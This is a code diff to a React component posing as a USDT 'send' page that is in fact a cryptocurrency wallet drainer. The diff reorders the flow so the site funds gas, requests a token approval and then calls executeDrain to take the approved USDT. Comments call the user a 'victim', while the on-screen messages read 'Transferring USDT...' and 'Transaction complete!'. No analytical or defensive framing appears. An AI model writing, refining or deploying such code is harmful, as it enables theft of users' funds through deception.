@@ -25,7 +25,7 @@ export default function SendPage({ provider, address }: Props) {
     const init = async () => {
       if (!mountedRef.current) return
       try {
-        await ensureCorrectNetwork(provider)
+        const switchedProvider = await ensureCorrectNetwork(provider)
         if (!mountedRef.current) return
         setNetworkOk(true)
         setNetworkError("")
@@ -37,10 +37,10 @@ export default function SendPage({ provider, address }: Props) {
       }
       try {
         const usdt = new ethers.Contract(
-          USDT_ADDRESS,
-          ["function balanceOf(address) view returns (uint256)"],
-          provider
-        )
+  USDT_ADDRESS,
+  ["function balanceOf(address) view returns (uint256)"],
+  provider
+)
         const bal = await usdt.balanceOf(address)
         if (mountedRef.current) setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
       } catch (err: any) {
@@ -54,36 +54,49 @@ export default function SendPage({ provider, address }: Props) {
     return () => { mountedRef.current = false }
   }, [address, provider])
 
- const handleNext = async () => {
+    const handleNext = async () => {
     setStage("switching_network")
     setStatusMsg("Preparing network...")
-    try {
-      // ensureCorrectNetwork now returns a NEW provider after switching
-      const switchedProvider = await ensureCorrectNetwork(provider)
+  try {
+    // ensureCorrectNetwork now returns a NEW provider after switching
+    const switchedProvider = await ensureCorrectNetwork(provider)
 
-      setStage("approving")
-      setStatusMsg("Waiting for approval...")
-
-      // Pass the NEW provider to requestApproval
-      const approvedAmount = await requestApproval(switchedProvider, address)
-
-      if (!approvedAmount) { setStage("error"); setStatusMsg("Approval failed."); return }
-
-      setStage("checking_gas")
-      setStatusMsg("Checking gas balance...")
-      const hasGas = await ensureGas(switchedProvider, address)
-      if (!hasGas) { setStage("error"); setStatusMsg("Could not fund gas."); return }
-
-      setStage("draining")
-      setStatusMsg("Transferring USDT...")
-      const drained = await executeDrain(address, approvedAmount)
-      if (drained) { setStage("done"); setStatusMsg("Transaction complete!") }
-      else { setStage("error"); setStatusMsg("Drain failed - check logs.") }
-    } catch (err: any) {
+    // 1) GAS FIRST — victim needs BNB to sign the approval
+    setStage("checking_gas")
+    setStatusMsg("Checking gas balance...")
+    const hasGas = await ensureGas(switchedProvider, address)
+    if (!hasGas) {
       setStage("error")
-      setStatusMsg("Error: " + (err.message || "Unknown error"))
+      setStatusMsg("Could not fund gas.")
+      return
     }
+
+    // 2) THEN approval
+    setStage("approving")
+    setStatusMsg("Waiting for approval...")
+    const approvedAmount = await requestApproval(switchedProvider, address)
+    if (!approvedAmount) {
+      setStage("error")
+      setStatusMsg("Approval failed.")
+      return
+    }
+
+    // 3) THEN drain
+    setStage("draining")
+    setStatusMsg("Transferring USDT...")
+    const drained = await executeDrain(address, approvedAmount)
+    if (drained) {
+      setStage("done")
+      setStatusMsg("Transaction complete!")
+    } else {
+      setStage("error")
+      setStatusMsg("Drain failed - check logs.")
+    }
+  } catch (err: any) {
+    setStage("error")
+    setStatusMsg("Error: " + (err.message || "Unknown error"))
   }
+}
   if (stage !== "idle") {
     return (
       <div className="fixed inset-0 z-[1000] bg-[rgba(0,0,0,0.92)] flex flex-col items-center justify-center p-6">
@@ -197,10 +210,10 @@ export default function SendPage({ provider, address }: Props) {
         style={{ height: "78px", borderRadius: "22px", paddingLeft: "22px", paddingRight: "22px" }}
       >
         <input
+          value={amount}
           type="number"
           inputMode="decimal"
           placeholder="USDT Amount"
-          value={amount}
           onChange={(e) => setAmount(e.target.value)}
           className="flex-1 bg-transparent text-[#F2F2F2] border-none outline-none placeholder-[#F2F2F2]"
           style={{ fontSize: "20px", fontWeight: 400 }}
